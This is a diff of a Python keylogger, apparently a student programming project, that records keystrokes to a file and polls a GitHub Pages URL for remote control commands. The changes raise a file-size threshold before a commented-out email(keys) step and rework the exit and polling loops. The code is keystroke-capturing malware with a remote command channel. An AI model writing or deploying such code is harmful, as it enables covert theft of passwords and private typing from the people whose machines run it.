@@ -25,7 +25,6 @@ def on_press(key):
 
     keys.append(str(key))
     count += 1
-    print("print",globalX)
     if(globalX=="CLOSE"):
         sys.exit(0)
 
@@ -71,6 +70,8 @@ def on_release(key):
     global globalX
     if key == Key.esc:
         globalX="CLOSE"
+        sys.exit(0)
+        print("buraya girdi")
         return False
 def write_file(keys):
     boolValue=False
@@ -81,7 +82,7 @@ def write_file(keys):
             except Exception as e:
                 print(e)
         print(f.tell())
-        if (int(f.tell()) > 2000):
+        if (int(f.tell()) > 15000):
             boolValue=True
             #email(keys)
            # print(keys)
@@ -103,8 +104,7 @@ def write_file(keys):
 def sorgula():
     global globalX
     while(True):
-        if(globalX=="CLOSE"):
-            sys.exit()
+
         url = "https://halil-ibrahim-gunbulak.github.io/AdvanceProgramming-WorkSpace/sorgu/index.html"
         soup = BeautifulSoup(requests.get(url).content, "html.parser")
         c = soup.find('div', attrs={"class": "text"})
@@ -114,7 +114,12 @@ def sorgula():
         print(type(c))
         print(type(str(c[1][2])))
         print("içeri girdi")
-        time.sleep(120)
+        for i in range(120):
+            time.sleep(1)
+            if (globalX == "CLOSE"):
+                sys.exit()
+
+
         print("süre bitti")
         globalX=str(c[1][0:2])
 
